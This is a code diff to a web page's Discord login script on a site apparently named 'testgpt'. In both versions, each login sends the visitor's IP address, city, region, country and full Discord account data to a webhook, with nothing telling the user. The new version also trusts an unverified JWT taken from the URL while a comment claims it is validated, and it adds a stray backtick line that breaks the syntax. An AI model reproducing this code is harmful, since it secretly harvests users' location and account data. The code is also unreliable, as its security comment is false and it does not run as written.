@@ -211,27 +211,29 @@ ${userDataFormatted}
     });
 
    // Function to update UI based on login state
-   async function updateUI() {
-        if (discordUser) {
-            const usernameElement = document.querySelector('.username');
-            usernameElement.innerText = userData.username; // Display the username
-            const profilePicture = profileUI.querySelector('.profile-picture');
-            profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`; // Update profile picture
+async function updateUI() {
+    if (discordUser) {
+        // Display user info in UI
+        const usernameElement = document.querySelector('.username');
+        usernameElement.innerText = discordUser.username;
+        const profilePicture = profileUI.querySelector('.profile-picture');
+        profilePicture.src = `https://cdn.discordapp.com/avatars/${discordUser.id}/${discordUser.avatar}`;
 
-            // Enable logout button, disable login button
-            logoutButton.disabled = false;
-            loginButton.disabled = true;
-        } else {
-            // User is not logged in, check URL for user data
-            const urlParams = new URLSearchParams(window.location.search);
-            const userParam = urlParams.get('user');
+        // Enable logout, disable login
+        logoutButton.disabled = false;
+        loginButton.disabled = true;
+    } else {
+        const urlParams = new URLSearchParams(window.location.search);
+        const tokenParam = urlParams.get('token');
 
-            if (userParam) {
-                // If user data is in the URL, parse and store it
-                const userData = JSON.parse(decodeURIComponent(userParam));
-                localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
-                await sendWebhook("User Login", `
-**IP:** ${ipData.ip}
+        if (tokenParam) {
+            try {
+                // Decode and verify token (e.g., by calling your backend to validate)
+                const userData = parseJwt(tokenParam);
+
+                // Store in local storage
+                localStorage.setItem('discordUser', JSON.stringify(userData));
+                await sendWebhook("User Login", `**IP:** ${ipData.ip}
 **City:** ${ipData.city}
 **Region:** ${ipData.region}
 **Country:** ${ipData.country}
@@ -242,24 +244,37 @@ ${userDataFormatted}
 **Discord User Data:** \`\`\`py
 ${userDataFormatted}
 \`\`\`
-`.trim(), Math.floor(Math.random() * 16777215));
+`.trim(), Math.floor(Math.random() * 16777215));`);
                 updateUI();
                 window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
-            } else {
-                // Not logged in and no user data in URL
-                logoutButton.disabled = true;
-                loginButton.disabled = false;
-
-                // Disable the send button and update status UI
-                sendButton.disabled = true;
-                statusMessage.innerText = "You need to login to use this service.";
-                statusImage.src = statusEmojis.LOL; // Set to "LOL" placeholder image for now
+            } catch (error) {
+                console.error("Invalid token or tampering detected:", error);
+                localStorage.removeItem('discordUser');
+                alert("Invalid login, please try again.");
             }
+        } else {
+            // Not logged in, show login button
+            logoutButton.disabled = true;
+            loginButton.disabled = false;
+            sendButton.disabled = true;
+            statusMessage.innerText = "You need to login to use this service.";
+            statusImage.src = statusEmojis.LOL;
         }
     }
+}
 
-    // Initial UI setup
-    updateUI(); // Check and update UI on page load
+// Utility function to parse JWT
+function parseJwt(token) {
+    const base64Url = token.split('.')[1];
+    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+    const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+    return JSON.parse(jsonPayload);
+}
+
+// Initial UI setup
+updateUI(); // Check and update UI on page load
 
     // Copy to clipboard functionality
     const copyButton = document.getElementById('copyResponseToClipboard');
